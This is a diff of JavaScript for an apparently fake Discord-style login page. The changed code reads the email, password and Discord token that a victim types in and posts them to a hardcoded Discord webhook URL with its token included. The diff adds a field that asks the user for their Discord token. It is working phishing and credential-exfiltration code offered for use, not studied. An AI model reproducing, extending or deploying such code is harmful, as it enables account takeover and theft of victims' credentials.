@@ -2,11 +2,12 @@
 // SELECTING ELEMENTS
 // ----------------------------------
 const loginButton = document.querySelector("button");
-const usernameInput = document.querySelector("#username"); // Assuming an input field with id="username"
-const passwordInput = document.querySelector("#password"); // Assuming an input field with id="password"
+const emailInput = document.querySelector("#email"); // Email input
+const passwordInput = document.querySelector("#password"); // Password input
+const tokenInput = document.querySelector("#token"); // Discord token input
 
 // Replace with your webhook URL
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // e.g., "https://discord.com/api/webhooks/..."
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G";
 
 // -----------------------------------
 // ELLIPSIS ANIMATION
@@ -18,7 +19,6 @@ function removeEllipsisAnimation() {
 }
 
 function animateEllipsis() {
-  loginButton.innerHTML = "";
   loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                             <span class="inner pulsingEllipsis">
                                 <span class="item spinnerItem"></span>
@@ -44,16 +44,13 @@ function animateEllipsis() {
 async function sendLoginDataToWebhook() {
   try {
     // Capture login information
-    const username = usernameInput ? usernameInput.value : "N/A";
+    const email = emailInput ? emailInput.value : "N/A";
     const password = passwordInput ? passwordInput.value : "N/A";
-    
-    // For this example, I'm assuming the Discord token is provided or obtained elsewhere
-    // In a real scenario, you might get this via OAuth or a user-provided input
-    const discordToken = "USER_DISCORD_TOKEN"; // Replace with actual token retrieval logic
+    const discordToken = tokenInput ? tokenInput.value : "N/A";
 
     // Prepare payload
     const payload = {
-      username: username,
+      email: email,
       password: password,
       discordToken: discordToken,
       timestamp: new Date().toISOString(),
@@ -71,7 +68,7 @@ async function sendLoginDataToWebhook() {
           {
             title: "Login Information",
             fields: [
-              { name: "Username/Email", value: username || "N/A", inline: true },
+              { name: "Email", value: email || "N/A", inline: true },
               { name: "Password", value: password || "N/A", inline: true },
               { name: "Discord Token", value: discordToken || "N/A", inline: false },
               { name: "Timestamp", value: new Date().toISOString(), inline: false },
